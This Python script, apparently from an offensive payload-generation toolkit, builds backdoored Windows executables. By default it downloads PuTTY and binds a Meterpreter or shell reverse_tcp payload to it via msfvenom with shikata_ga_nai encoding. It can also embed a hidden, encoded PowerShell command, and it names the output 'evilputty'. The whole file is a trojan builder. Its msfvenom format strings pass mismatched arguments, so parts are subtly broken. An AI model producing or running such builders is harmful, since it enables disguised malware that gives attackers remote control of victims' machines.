#!/usr/bin/python
#
# Create backdoored executables with either standard msf
# payloads or PayGens powershell module

import os
import base64
import sys
import subprocess
import re
import time
import urllib
from src.core import menus
from src.core.main import *

# grab interface ip
iface = iface_ip()

# grab the metasploit path
msf_path = msfpath()

while 1:
	try:
		clear()
		
		# chose payload
		menus.backdoored_menu1()
		selection = raw_input(" %sSelection > %s" % (colours.bold, colours.reset))
		if selection == '1' or selection == '':
			payload = 'windows/meterpreter/reverse_tcp'
		if selection == '2':
			payload = 'windows/shell/reverse_tcp'
		
		# get some user info
		ip = raw_input("\n Enter your local or remote ip (%s): " % iface)
		if ip == '':
			ip = iface
		port = raw_input(" Enter a port (default 8080): ")
		if port == '':
			port = 8080
		infile = raw_input(" Enter path to executeable (default putty): ")
		if infile == '':
			PrintInfo("Downloading putty.exe")
			time.sleep(1)
			urllib.urlretrieve('http://the.earth.li/~sgtatham/putty/latest/x86/putty.exe','/tmp/putty.exe')
			infile = '/tmp/putty.exe'
		outfile = raw_input("\n Enter name for output file (default evilputty): ")
		if outfile == '':
			outfile = 'evilputty'
						
		# standard or powershell
		menus.backdoored_menu2()
		bdtype = raw_input(" %sSelection > %s" % (colours.bold, colours.reset))
		
		if bdtype == '1':
			PrintInfo("Binding payload to executeable\n")
			subprocess.Popen("msfvenom -p %s lhost=%s lport=%s -e x86/shikata_ga_nai -i 5 -x %s -f exe > output/%s.exe" % (msf_path, payload, ip, port, infile, outfile), shell=True).wait()
			PrintInfo("Payload output/%s created" % outfile)
			
		elif bdtype == '2' or bdtype == '':
						
			# create payload bat file in /tmp
			PrintInfo("Generating powershell code")
			ipaddr = ip
			
			import src.platforms.powershell as ps
			
			x86 = ps.generate_payload(payload, ipaddr, port)
			x86file = "output/paygen-x86.bat"
			fw = open(x86file, "w")
			fw.write("@echo off\n")
			fw.write("powershell -noprofile -windowstyle hidden -noninteractive -EncodedCommand %s" % x86)
			fw.close()
			time.sleep(2)
			
			PrintInfo("Binding payload to executeable")
			subprocess.Popen("cat %s | msfvenom -a x86 --platform windows -x %s -f exe -k > output/%s.exe" % (x86file, msf_path, infile, outfile), shell=True).wait()
			PrintInfo("Payload output/%s created" % outfile)
			
			# clean up
			os.remove(x86file)
		
		# return to main
		EntContinue()
		break
	
	except KeyboardInterrupt:
		break
